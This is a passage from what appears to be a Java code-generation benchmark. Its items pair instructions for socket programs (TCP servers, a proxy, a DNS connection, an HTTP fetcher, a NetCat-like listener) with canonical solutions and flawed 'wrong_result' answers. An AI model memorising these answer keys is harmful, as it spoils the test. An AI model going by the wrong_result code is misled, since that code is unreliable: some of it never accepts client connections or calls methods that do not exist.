   return uri;\n    }\n\n    private void handleClient(Socket clientSocket, String filename, String mimeType) {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            String requestLine = in.readLine();\n            if (requestLine == null) {\n                return;\n            }\n            String[] parts = requestLine.split(\"\\\\s+\");\n            if (parts.length < 3 || !parts[0].equals(\"GET\")) {\n                sendError(clientSocket, 400, \"Bad Request\");\n                return;\n            }\n            String path = parts[1];\n            if (!path.equals(\"/\" + filename)) {\n                sendError(clientSocket, 404, \"Not Found\");\n                return;\n            }\n\n            File file = new File(filename);\n            if (!file.exists()) {\n                sendError(clientSocket, 404, \"Not Found\");\n                return;\n            }\n\n            StringBuilder response = new StringBuilder();\n            response.append(\"HTTP/1.1 200 OK\\r\\n\")\n                   .append(\"Content-Type: \").append(mimeType).append(\"\\r\\n\")\n                   .append(\"Content-Length: \").append(file.length()).append(\"\\r\\n\")\n                   .append(\"\\r\\n\");\n\n            OutputStream out = clientSocket.getOutputStream();\n            out.write(response.toString().getBytes());\n            out.flush();\n\n            FileInputStream fis = new FileInputStream(file);\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = fis.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n            fis.close();\n            out.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void sendError(Socket clientSocket, int statusCode, String message) throws IOException {\n        StringBuilder response = new StringBuilder();\n        response.append(\"HTTP/1.1 \").append(statusCode).append(\" \").append(message).append(\"\\r\\n\")\n                .append(\"Content-Type: text/plain\\r\\n\")\n                .append(\"Content-Length: \").append(message.length()).append(\"\\r\\n\")\n                .append(\"\\r\\n\")\n                .append(message);\n        OutputStream out = clientSocket.getOutputStream();\n        out.write(response.toString().getBytes());\n        out.flush();\n    }\n}"
  },
  {
    "Task_id": 526,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using ServerSocket to accept client connections and read data from them.\n\nClass Description: The GraphiteBridge class provides functionality to start a TCP server, accept client connections, read data from connected clients, and properly close all connections and resources.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming client connections\n- clientSocket: Socket - The socket representing an accepted client connection\n- inputReader: BufferedReader - The reader used to read data from the client connection\n\nMethods:\n- startServer(int port) -> void - Starts the server socket listening on the specified port\n- acceptConnection() -> void - Accepts an incoming client connection and initializes the input reader\n- readData() -> String - Reads a line of data from the connected client\n- closeConnection() -> void - Closes all open resources including the input reader, client socket, and server socket",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class GraphiteBridge {\n\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n    private BufferedReader inputReader;\n\n    public void startServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    public void acceptConnection() throws IOException {\n        clientSocket = serverSocket.accept();\n        inputReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n    }\n\n    public String readData() throws IOException {\n        return inputReader.readLine();\n    }\n\n    public void closeConnection() throws IOException {\n        if (inputReader != null) {\n            inputReader.close();\n        }\n        if (clientSocket != null) {\n            clientSocket.close();\n        }\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class GraphiteBridge {\n    private ServerSocket serverSocket;\n    private Socket clientSocket;\n    private BufferedReader inputReader;\n\n    public void startServer(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void acceptConnection() {\n        try {\n            clientSocket = serverSocket.accept();\n            inputReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String readData() {\n        try {\n            return inputReader.readLine();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (inputReader != null) inputReader.close();\n            if (clientSocket != null) clientSocket.close();\n            if (serverSocket != null) serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 527,
    "Instruction": "Task Description: Create a TCP proxy server class that handles bidirectional communication between a client and a remote server, with capabilities to start, monitor usage, and shutdown the proxy.\n\nClass Description: JankyProxy is a TCP proxy server implementation that listens on a local port, forwards client requests to a remote server, and relays responses back to the client. It uses multithreading to handle bidirectional communication simultaneously.\n\nAttributes:\n- thread: ThreadProxy - The worker thread handling the proxy operations\n- sClient: Socket - The client socket connection\n- socket: ServerSocket - The server socket listening for client connections\n- SERVER_URL: String - The URL of the remote server to proxy to\n- SERVER_PORT: int - The port of the remote server to proxy to\n- wasUsedForClientToServer: boolean - Flag indicating if the proxy was used for client-to-server communication\n\nMethods:\n- runServer(String host, int remoteport, int localport) -> void - Starts the proxy server listening on the specified local port and forwarding to the given remote host and port\n- wasUsed() -> boolean - Returns whether the proxy was used for client-to-server communication\n- shutdown() -> void - Gracefully shuts down the proxy server\n- run() -> void - (ThreadProxy method) The main proxy logic handling bidirectional communication between client and server\n- shutdown() -> void - (ThreadProxy method) Stops the proxy thread and closes connections",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\n\npublic class JankyProxy {\n    private static ThreadProxy thread;\n\n    public static void runServer(String host, int remoteport, int localport) {\n        try {\n            System.out.println(\"Starting proxy for \" + host + \":\" + remoteport + \" on port \" + localport);\n            ServerSocket server = new ServerSocket(localport);\n            thread = new ThreadProxy(server, host, remoteport);\n        } catch (Exception e) {\n            System.err.println(e);\n            System.err.println(\"Usage: java ProxyMultiThread <host> <remoteport> <localport>\");\n        }\n    }\n\n    public static boolean wasUsed() {\n        return thread.wasUsedForClientToServer;\n    }\n\n    public static void shutdown() {\n        if (thread != null) {\n            try {\n                thread.shutdown();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ThreadProxy extends Thread {\n        private Socket sClient;\n        private ServerSocket socket;\n        private final String SERVER_URL;\n        private final int SERVER_PORT;\n        public boolean wasUsedForClientToServer;\n\n        public ThreadProxy(ServerSocket socket, String ServerUrl, int ServerPort) {\n            this.SERVER_URL = ServerUrl;\n            this.SERVER_PORT = ServerPort;\n            this.socket = socket;\n            this.start();\n        }\n\n        @Override\n        public void run() {\n            try {\n                sClient = socket.accept();\n                final byte[] request = new byte[1024];\n                byte[] reply = new byte[4096];\n                final InputStream inFromClient = sClient.getInputStream();\n                final OutputStream outToClient = sClient.getOutputStream();\n                Socket server = null;\n\n                try {\n                    server = new Socket(SERVER_URL, SERVER_PORT);\n                } catch (IOException e) {\n                    PrintWriter out = new PrintWriter(new OutputStreamWriter(outToClient));\n                    out.flush();\n                    System.out.println(\"SERVER_URL = \" + SERVER_URL + \" : \" + SERVER_PORT);\n                    throw new RuntimeException(e);\n                }\n\n                final InputStream inFromServer = server.getInputStream();\n                final OutputStream outToServer = server.getOutputStream();\n\n                new Thread(() -> {\n                    int bytes_read;\n                    try {\n                        while ((bytes_read = inFromClient.read(request)) != -1) {\n                            outToServer.write(request, 0, bytes_read);\n                            outToServer.flush();\n                            wasUsedForClientToServer = true;\n                        }\n                    } catch (IOException ignored) {\n                    }\n                    try {\n                        outToServer.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }).start();\n\n                int bytes_read;\n                try {\n                    while ((bytes_read = inFromServer.read(reply)) != -1) {\n                        outToClient.write(reply, 0, bytes_read);\n                        outToClient.flush();\n                    }\n                } catch (IOException e) {\n                } finally {\n                    try {\n                        if (server != null) server.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                outToClient.close();\n                sClient.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void shutdown() {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            interrupt();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "import java.io.*;\nimport java.net.*;\n\npublic class JankyProxy {\n    private ThreadProxy thread;\n    private Socket sClient;\n    private ServerSocket socket;\n    private String SERVER_URL;\n    private int SERVER_PORT;\n    private boolean wasUsedForClientToServer;\n\n    public void runServer(String host, int remoteport, int localport) {\n        try {\n            socket = new ServerSocket(localport);\n            SERVER_URL = host;\n            SERVER_PORT = remoteport;\n            thread = new ThreadProxy(this);\n            thread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean wasUsed() {\n        return wasUsedForClientToServer;\n    }\n\n    public void shutdown() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n            if (thread != null) {\n                thread.shutdown();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        // This method is intended for ThreadProxy's run, but not directly used here\n    }\n\n    private class ThreadProxy extends Thread {\n        private Socket clientSocket;\n        private JankyProxy proxy;\n\n        public ThreadProxy(JankyProxy proxy) {\n            this.proxy = proxy;\n        }\n\n        public void run() {\n            try {\n                Socket remoteSocket = new Socket(SERVER_URL, SERVER_PORT);\n                InputStream clientIn = clientSocket.getInputStream();\n                OutputStream clientOut = clientSocket.getOutputStream();\n                InputStream remoteIn = remoteSocket.getInputStream();\n                OutputStream remoteOut = remoteSocket.getOutputStream();\n\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n\n                while ((bytesRead = clientIn.read(buffer)) != -1) {\n                    proxy.wasUsedForClientToServer = true;\n                    remoteOut.write(buffer, 0, bytesRead);\n                }\n\n                while ((bytesRead = remoteIn.read(buffer)) != -1) {\n                    clientOut.write(buffer, 0, bytesRead);\n                }\n\n                clientSocket.close();\n                remoteSocket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void shutdown() {\n            try {\n                if (clientSocket != null) {\n                    clientSocket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 529,
    "Instruction": "Task Description: Implement a Java class for handling DNS connections using TCP sockets, including server listening, client connection, message sending/receiving, and resource cleanup.\n\nClass Description: The DNSConnection class provides functionality for establishing and managing TCP-based DNS connections. It supports both server-side (incoming) and client-side (outgoing) connections, message transmission with length prefixing, and proper resource management.\n\nAttributes:\n- PORT: [int] - Constant defining the DNS port (53)\n- MAX_MSG_LEN: [int] - Maximum allowed message length (65535)\n- listener: [ServerSocket] - Server socket for incoming connections\n- socket: [Socket] - Current active socket connection\n- msgBytes: [byte[]] - Buffer for received message data\n- msgLen: [int] - Length of the current message\n- in: [BufferedInputStream] - Input stream for reading data\n- out: [OutputStream] - Output stream for writing data\n- lenBuf: [byte[]] - Buffer for message length prefix (2 bytes)\n\nMethods:\n- listen(): [void] -> [void] - Starts listening for incoming connections on the DNS port\n- stopListening(): [void] -> [void] - Stops the server socket from listening\n- openIncoming(): [void] -> [void] - Accepts an incoming client connection\n- open(InetAddress server): [void] -> [void] - Opens a connection to a DNS server\n- send(byte[] msgBytes): [void] -> [void] - Sends a message with length prefix\n- receive(boolean wait): [byte[]] -> [byte[]] - Receives a message (optionally waiting)\n- close(): [void] -> [void] - Closes the current connection and cleans up resources",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\n\npublic final class DNSConnection {\n\n    public static final int PORT = 53;\n    public static final int MAX_MSG_LEN = 0xFFFF;\n    protected static ServerSocket listener;\n    protected Socket socket;\n    protected byte[] msgBytes;\n    protected int msgLen;\n    protected BufferedInputStream in;\n    protected OutputStream out;\n    protected final byte[] lenBuf = new byte[2];\n\n    public DNSConnection() {}\n\n    public static void listen() throws IOException {\n        ServerSocket curListener;\n        if ((curListener = listener) == null) {\n            try {\n                listener = new ServerSocket(PORT);\n            } catch (SecurityException e) {\n                throw new SocketException(\"SecurityException: listen()\");\n            }\n        }\n        curListener = null;\n    }\n\n    public static void stopListening() {\n        ServerSocket curListener;\n        if ((curListener = listener) != null) {\n            listener = null;\n            try {\n                curListener.close();\n            } catch (IOException e) {}\n            curListener = null;\n        }\n    }\n\n    public void openIncoming() throws IOException {\n        ServerSocket curListener;\n        if ((curListener = listener) != null) {\n            try {\n                Socket socket = curListener.accept();\n                BufferedInputStream in = new BufferedInputStream(socket.getInputStream(), DNSMsgHeader.UDP_PACKET_LEN);\n                this.out = socket.getOutputStream();\n                this.in = in;\n                this.msgBytes = null;\n                this.socket = socket;\n                return;\n            } catch (SecurityException e) {}\n        }\n        throw new SocketException(curListener == null ? \"Not listening\" : \"SecurityException: accept()\");\n    }\n\n    public void open(InetAddress server) throws NullPointerException, IOException {\n        server.hashCode();\n        try {\n            Socket socket = new Socket(server, PORT);\n            BufferedInputStream in = new BufferedInputStream(socket.getInputStream(), DNSMsgHeader.UDP_PACKET_LEN);\n            this.out = socket.getOutputStream();\n            this.in = in;\n            this.socket = socket;\n        } catch (SecurityException e) {\n            throw new SocketException(\"SecurityException: connect(\" + server.getHostAddress() + \")\");\n        }\n        this.msgBytes = null;\n    }\n\n    public void send(byte[] msgBytes) throws NullPointerException, IOException {\n        int msgLen;\n        if ((msgLen = msgBytes.length) >= MAX_MSG_LEN)\n            msgLen = MAX_MSG_LEN;\n        OutputStream out;\n        if ((out = this.out) == null)\n            throw new SocketException(\"Connection closed\");\n        byte[] lenBuf = this.lenBuf;\n        lenBuf[0] = (byte)(msgLen >> 8);\n        lenBuf[1] = (byte)msgLen;\n        out.write(lenBuf, 0, 2);\n        out.write(msgBytes, 0, msgLen);\n        out.flush();\n    }\n\n    public byte[] receive(boolean wait) throws IOException {\n        byte[] msgBytes;\n        int msgLen, len;\n        BufferedInputStream in;\n        if ((in = this.in) == null)\n            throw new SocketException(\"Connection closed\");\n        if ((msgLen = this.msgLen) <= 0)\n            msgLen = 0;\n        if ((msgBytes = this.msgBytes) == null) {\n            do {\n                if (!wait && in.available() <= 0)\n                    return null;\n                else if ((len = in.read()) < 0)\n                    throw new EOFException();\n                else if (msgLen <= 0)\n                    this.msgLen = msgLen = len + 1;\n                else break;\n            } while (true);\n            if ((msgLen = ((msgLen - 1) << 8) | len) <= 0)\n                msgLen = 0;\n            this.msgBytes = msgBytes = new byte[msgLen];\n            msgLen = 0;\n        }\n        for (int avail; (len = msgBytes.length - (this.msgLen = msgLen)) > 0; msgLen += len)\n            if (!wait && (avail = in.available()) < len && (len = avail) <= 0)\n                return null;\n            else if ((len = in.read(msgBytes, msgLen, len)) < 0)\n                throw new EOFException();\n        this.msgBytes = null;\n        this.msgLen = 0;\n        return msgBytes;\n    }\n\n    public void close() {\n        Socket socket;\n        if ((socket = this.socket) != null) {\n            this.socket = null;\n            this.in = null;\n            this.out = null;\n            this.msgBytes = null;\n            try {\n                socket.close();\n            } catch (IOException e) {}\n            socket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class DNSConnection {\n    public static final int PORT = 53;\n    public static final int MAX_MSG_LEN = 65535;\n    private ServerSocket listener;\n    private Socket socket;\n    private byte[] msgBytes;\n    private int msgLen;\n    private BufferedInputStream in;\n    private OutputStream out;\n    private byte[] lenBuf;\n\n    public void listen() throws IOException {\n        listener = new ServerSocket(PORT);\n    }\n\n    public void stopListening() throws IOException {\n        if (listener != null) {\n            listener.close();\n        }\n    }\n\n    public void openIncoming() throws IOException {\n        socket = listener.accept();\n        in = new BufferedInputStream(socket.getInputStream());\n        out = socket.getOutputStream();\n        msgBytes = new byte[MAX_MSG_LEN];\n        msgLen = 0;\n        lenBuf = new byte[2];\n    }\n\n    public void open(InetAddress server) throws IOException {\n        socket = new Socket(server, PORT);\n        in = new BufferedInputStream(socket.getInputStream());\n        out = socket.getOutputStream();\n        msgBytes = new byte[MAX_MSG_LEN];\n        msgLen = 0;\n        lenBuf = new byte[2];\n    }\n\n    public void send(byte[] msgBytes) throws IOException {\n        if (msgBytes.length > MAX_MSG_LEN) {\n            throw new IllegalArgumentException(\"Message too long\");\n        }\n        out.write((msgBytes.length >> 8) & 0xFF);\n        out.write(msgBytes.length & 0xFF);\n        out.write(msgBytes);\n    }\n\n    public byte[] receive(boolean wait) throws IOException {\n        int len = 0;\n        if (wait) {\n            lenBuf[0] = (byte) in.read();\n            lenBuf[1] = (byte) in.read();\n            len = (lenBuf[0] & 0xFF) << 8 | (lenBuf[1] & 0xFF);\n        } else {\n            lenBuf[0] = (byte) in.read();\n            lenBuf[1] = (byte) in.read();\n            len = (lenBuf[0] & 0xFF) << 8 | (lenBuf[1] & 0xFF);\n        }\n        if (len < 0 || len > MAX_MSG_LEN) {\n            throw new IllegalArgumentException(\"Invalid message length\");\n        }\n        int bytesRead = 0;\n        while (bytesRead < len) {\n            bytesRead += in.read(msgBytes, bytesRead, len - bytesRead);\n        }\n        return Arrays.copyOf(msgBytes, len);\n    }\n\n    public void close() throws IOException {\n        if (socket != null) {\n            socket.close();\n        }\n        if (in != null) {\n            in.close();\n        }\n        if (out != null) {\n            out.close();\n        }\n        listener = null;\n        socket = null;\n        in = null;\n        out = null;\n        msgBytes = null;\n        lenBuf = null;\n    }\n}"
  },
  {
    "Task_id": 53,
    "Instruction": "Task Description: Create a function that retrieves content from a given HTTP/HTTPS URL and handles redirects with proper cookie management.\n\nFunction Description: The function establishes an HTTP connection to the specified URL, follows redirects (up to 10 times), maintains cookies during redirects, and returns the input stream of the final response. It handles standard HTTP response codes and supports common request headers.\n\nInput: \n- urlStr: String - The URL string to fetch content from (must start with \"http://\" or \"https://\")\n\nOutput: \n- InputStream - The input stream containing the response data from the final URL after following redirects, or null if:\n  - The URL scheme is not HTTP/HTTPS\n  - An exception occurs during the process\n  - Maximum redirect count (10) is exceeded",
    "Canonical_solution": "import java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate InputStream getKmlContents(String urlStr) {\n    InputStream inputStream;\n    try {\n        if (urlStr.startsWith(\"http://\") || urlStr.startsWith(\"https://\")) {\n            URL url = new URL(urlStr);\n            boolean redirect = true;\n            HttpURLConnection http = null;\n            String cookies = null;\n            int redirectCnt = 0;\n            while(redirect && redirectCnt < 10) {\n                redirect = false;\n                http = (HttpURLConnection)url.openConnection();\n                http.setRequestMethod(\"GET\");\n                if (cookies != null) {\n                    http.setRequestProperty(\"Cookie\", cookies);\n                }\n                http.addRequestProperty(\"Accept-Language\", \"en-US,en;q=0.8\");\n                http.addRequestProperty(\"User-Agent\", \"Mozilla\");\n                http.setInstanceFollowRedirects(true);\n                HttpURLConnection.setFollowRedirects(true);\n\n                int status = http.getResponseCode();\n                if (status != HttpURLConnection.HTTP_OK) {\n                    if (status == HttpURLConnection.HTTP_MOVED_TEMP\n                        || status == HttpURLConnection.HTTP_MOVED_PERM\n                        || status == HttpURLConnection.HTTP_SEE_OTHER)\n                        redirect = true;\n                }\n                if (redirect) {\n                    url = new URL(http.getHeaderField(\"Location\"));\n                    cookies = http.getHeaderField(\"Set-Cookie\");\n                    http.disconnect();\n                    redirectCnt++;\n                }\n            }\n            inputStream = http.getInputStream();\n        } else {\n            // Handle other URL types (file://, etc)\n            return null;\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n        return null;\n    }\n    return inputStream;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "public static InputStream fetchContent(String urlStr) throws Exception {\n    if (!urlStr.startsWith(\"http://\") && !urlStr.startsWith(\"https://\")) {\n        return null;\n    }\n\n    int redirectCount = 0;\n    URL currentUrl = new URL(urlStr);\n    HttpURLConnection connection = (HttpURLConnection) currentUrl.openConnection();\n    connection.setRequestMethod(\"GET\");\n    connection.setInstanceFollowRedirects(false);\n    connection.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n\n    while (redirectCount < 10) {\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= 300 && responseCode < 400) {\n            String location = connection.getHeaderField(\"Location\");\n            if (location == null || location.isEmpty()) {\n                return null;\n            }\n\n            URL newUrl = new URL(currentUrl, location);\n            String cookies = connection.getRequestProperty(\"Cookie\");\n            if (cookies == null) {\n                cookies = \"\";\n            }\n\n            connection = (HttpURLConnection) newUrl.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n            connection.setRequestProperty(\"Cookie\", cookies);\n            currentUrl = newUrl;\n            redirectCount++;\n        } else {\n            if (responseCode >= 200 && responseCode < 300) {\n                return connection.getInputStream();\n            } else {\n                return null;\n            }\n        }\n    }\n\n    int finalResponseCode = connection.getResponseCode();\n    if (finalResponseCode >= 200 && finalResponseCode < 300) {\n        return connection.getInputStream();\n    } else {\n        return null;\n    }\n}"
  },
  {
    "Task_id": 531,
    "Instruction": "Task Description: Create a Java class that implements a simplified NetCat-like TCP server using ServerSocket for client-server communication, with WebSocket support for real-time interaction.\n\nClass Description: The NetCat class is a WebSocket plugin that creates a TCP server listening on a specified port, accepts client connections, and enables bidirectional communication between server and client through input/output streams.\n\nAttributes:\nport: [int] - The port number on which the server listens for client connections\nserver: [ServerSocket] - The ServerSocket instance used to accept client connections\nclient: [Socket] - The Socket instance representing the connected client\npool: [ExecutorService] - Thread pool for handling client communication\nos: [OutputStream] - Output stream for sending data to the client\npw: [PrintWriter] - Buffered writer for sending data to the client\n\nMethods:\ncheck: [Map param] -> [boolean] - Validates if the specified port is valid (>= 10000)\nbefore: [void] -> [void] - Initializes the ServerSocket and starts listening for connections\nlisten: [void] -> [void] - Accepts incoming client connections and sets up I/O streams\necho: [void] -> [void] - Continuously reads and displays data received from the client\nstart: [void] -> [Object] - Main execution loop that sends user input to the client\nonClose: [void] -> [void] - Cleans up resources by closing sockets and shutting down threads",
    "Canonical_solution": "import com.trackray.base.annotation.Plugin;\nimport com.trackray.base.annotation.Param;\nimport com.trackray.base.annotation.Rule;\nimport com.trackray.base.plugin.WebSocketPlugin;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Map;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\n@Plugin(value = \"netcat\", title = \"NetCat \u7b80\u6613\u7248\" , author = \"\u6d45\u84dd\")\n@Rule(params = {@Param(key = \"port\",defaultValue = \"10010\" , desc = \"\u76d1\u542c\u7684\u7aef\u53e3\uff0c\u5c3d\u91cf\u907f\u514d\u5c0f\u4e8e10000\u7684\u7aef\u53e3\"),},\n        sync = true,  websocket = true )\npublic class NetCat extends WebSocketPlugin {\n    private int port;\n    private ServerSocket server;\n    private Socket client;\n    private ExecutorService pool;\n    private OutputStream os;\n    private PrintWriter pw;\n\n    @Override\n    public boolean check(Map param) {\n        port = Integer.parseInt(param.get(\"port\").toString());\n        return port >= 10000;\n    }\n\n    @Override\n    public void before() {\n        try {\n            server = new ServerSocket(port);\n            pool = Executors.newSingleThreadExecutor();\n            println(\"port:\"+port);\n            println(\"\u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5\");\n            listen();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void listen() {\n        try {\n            client = server.accept();\n            if (client.isConnected()){\n                println(\"\u5ba2\u6237\u7aef\u5df2\u8fde\u63a5:\"+client.getInetAddress().getHostAddress());\n                os = client.getOutputStream();\n                pw = new PrintWriter(os, true);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        pool.execute(() -> {\n            while (true){\n                echo();\n            }\n        });\n    }\n\n    private void echo() {\n        try {\n            if (client.isConnected()){\n                InputStream is = client.getInputStream();\n                BufferedReader bri = new BufferedReader(new InputStreamReader(is));\n                String temp;\n                while ((temp = bri.readLine())!=null && !\"\".equals(temp)) {\n                    println(temp);\n                }\n            }\n        }catch (Exception e){\n            println(e.getMessage());\n        }\n    }\n\n    @Override\n    public Object start() {\n        while (client!=null && client.isConnected()){\n            String input = getInput();\n            if (StringUtils.isNotBlank(input)){\n                pw.println(input);\n            }\n        }\n        println(\"\u4e3b\u673a\u5df2\u4e0b\u7ebf\");\n        return null;\n    }\n\n    @Override\n    public void onClose() {\n        try {\n            pool.shutdownNow();\n            if (client!=null && !client.isClosed())\n            {\n                client.close();\n            }\n            server.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class NetCat {\n    private int port;\n    private ServerSocket server;\n    private Socket client;\n    private ExecutorService pool;\n    private OutputStream os;\n    private PrintWriter pw;\n\n    public NetCat(int port) {\n        this.port = port;\n    }\n\n    public boolean check(Map<String, Integer> param) {\n        int p = param.get(\"port\");\n        return p >= 10000;\n    }\n\n    public void before() {\n        try {\n            server = new ServerSocket(port);\n            pool = Executors.newCachedThreadPool();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void listen() {\n        try {\n            client = server.accept();\n            os = client.getOutputStream();\n            pw = new PrintWriter(os, true);\n            pool.execute(() -> {\n                try (InputStream is = client.getInputStream()) {\n                    byte[] buffer = new byte[1024];\n                    int bytesRead;\n                    while ((bytesRead = is.read(buffer)) != -1) {\n                        String data = new String(buffer, 0, bytesRead);\n                        System.out.print(data);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            });\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public Object start() {\n        Scanner scanner = new Scanner(System.in);\n        while (true) {\n            System.out.print(\"Enter message to send: \");\n            String input = scanner.nextLine();\n            if (input.equalsIgnoreCase(\"exit\")) {\n                break;\n            }\n            pw.println(input);\n        }\n        return null;\n    }\n\n    public void onClose() {\n        try {\n            if (client != null) client.close();\n            if (server != null) server.close();\n            if (pool != null) pool.shutdown();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 533,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using ServerSocket to handle client connections, process incoming requests, and send responses. The server should integrate with Eureka service discovery and manage its lifecycle through initialization and cleanup.\n\nClass Description: ExampleServiceBase is a singleton class that acts as a TCP server, listening on a specified port for client connections. It processes incoming requests by reading input from clients and sending back responses with a timestamp. The class integrates with Eureka service discovery to register its availability.\n\nAttributes:\n- applicationInfoManager: [ApplicationInfoManager] - Manages the service instance information for Eureka registration\n- eurekaClient: [EurekaClient] - Handles communication with the Eureka service discovery server\n\nMethods:\n- ExampleServiceBase([ApplicationInfoManager, EurekaClient]) -> [void] - Constructor that initializes the Eureka-related dependencies\n- start() -> [void] - Initializes the service by setting its status to UP in Eureka and starts listening for client connections on the registered port\n- processRequest([Socket]) -> [void] - Processes an incoming client connection by reading the request, generating a response with current timestamp, and sending it back to the client",
    "Canonical_solution": "import com.netflix.appinfo.ApplicationInfoManager;\nimport com.netflix.appinfo.InstanceInfo;\nimport com.netflix.discovery.EurekaClient;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Date;\n\n@Singleton\npublic class ExampleServiceBase {\n\n    private final ApplicationInfoManager applicationInfoManager;\n    private final EurekaClient eurekaClient;\n\n    @Inject\n    public ExampleServiceBase(ApplicationInfoManager applicationInfoManager,\n                            EurekaClient eurekaClient) {\n        this.applicationInfoManager = applicationInfoManager;\n        this.eurekaClient = eurekaClient;\n    }\n\n    @PostConstruct\n    public void start() {\n        applicationInfoManager.setInstanceStatus(InstanceInfo.InstanceStatus.UP);\n        \n        try {\n            int myServingPort = applicationInfoManager.getInfo().getPort();\n            ServerSocket serverSocket = new ServerSocket(myServingPort);\n            final Socket s = serverSocket.accept();\n            processRequest(s);\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processRequest(final Socket s) {\n        try {\n            BufferedReader rd = new BufferedReader(new InputStreamReader(s.getInputStream()));\n            String line = rd.readLine();\n            if (line != null) {\n                System.out.println(\"Received a request from the example client: \" + line);\n            }\n            String response = \"BAR \" + new Date();\n            System.out.println(\"Sending the response to the client: \" + response);\n\n            PrintStream out = new PrintStream(s.getOutputStream());\n            out.println(response);\n\n        } catch (Throwable e) {\n            System.err.println(\"Error processing requests\");\n        } finally {\n            if (s != null) {\n                try {\n                    s.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "public class ExampleServiceBase {\n    private final ApplicationInfoManager applicationInfoManager;\n    private final EurekaClient eurekaClient;\n    private ServerSocket serverSocket;\n\n    public ExampleServiceBase(ApplicationInfoManager applicationInfoManager, EurekaClient eurekaClient) {\n        this.applicationInfoManager = applicationInfoManager;\n        this.eurekaClient = eurekaClient;\n    }\n\n    public void start() {\n        applicationInfoManager.setInstanceStatus(\"UP\");\n        eurekaClient.registerApplication();\n\n        int port = applicationInfoManager.getInstanceInfo().getPort();\n        try {\n            serverSocket = new ServerSocket(port);\n            System.out.println(\"Server started on port \" + port);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                new Thread(() -> processRequest(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void processRequest(Socket socket) {\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n             PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {\n            StringBuilder request = new 